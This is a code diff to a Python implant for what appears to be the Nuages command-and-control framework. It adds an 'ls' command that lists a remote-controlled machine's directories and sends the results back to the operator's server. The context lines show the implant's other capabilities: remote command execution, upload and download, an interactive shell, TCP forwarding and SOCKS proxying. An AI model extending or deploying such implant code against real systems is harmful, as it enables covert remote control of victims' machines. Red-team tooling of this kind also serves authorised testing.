@@ -156,7 +156,7 @@ class NuagesImplant:
         self.handler = "HTTPAES256"
         self.implantType = "Python"
         self.connectionString = self.nuages.connectionString
-        self.supportedPayloads = ["cd", "command", "configure", "upload", "download", "interactive", "tcp_fwd", "socks", "exit"]
+        self.supportedPayloads = ["cd", "command", "ls", "configure", "upload", "download", "interactive", "tcp_fwd", "socks", "exit"]
         self.config = config
 
     def register(self):
@@ -587,6 +587,33 @@ class NuagesImplant:
         # The new directory is returned to the server
         self.jobresult(job["_id"], os.getcwd(), False)
 
+    def do_ls(self, job):
+        target_path = "."
+        if ("path" in job["payload"]["options"] and job["payload"]["options"]["path"]):
+            target_path = job["payload"]["options"]["path"]
+
+        os.chdir(target_path)
+
+        entries = []
+        with os.scandir(".") as it:
+            for entry in it:
+                item_type = "other"
+                item_size = None
+
+                if entry.is_dir(follow_symlinks=False):
+                    item_type = "directory"
+                elif entry.is_file(follow_symlinks=False):
+                    item_type = "file"
+                    item_size = entry.stat(follow_symlinks=False).st_size
+
+                entries.append({
+                    "name": entry.name,
+                    "size": item_size,
+                    "type": item_type
+                })
+
+        self.jobresult(job["_id"], json.dumps({"cwd": os.getcwd(), "files": entries}), False)
+
     def do_exit(self, job):
         # The implant exits with a message
         self.jobresult(job["_id"], "Bye!", False)
@@ -598,6 +625,8 @@ class NuagesImplant:
                 self.do_command(job)
             elif (job["payload"]["type"] == "cd"):
                 self.do_cd(job)
+            elif (job["payload"]["type"] == "ls"):
+                self.do_ls(job)
             elif (job["payload"]["type"] == "exit"):
                 self.do_exit(job)
             elif (job["payload"]["type"] == "configure"):
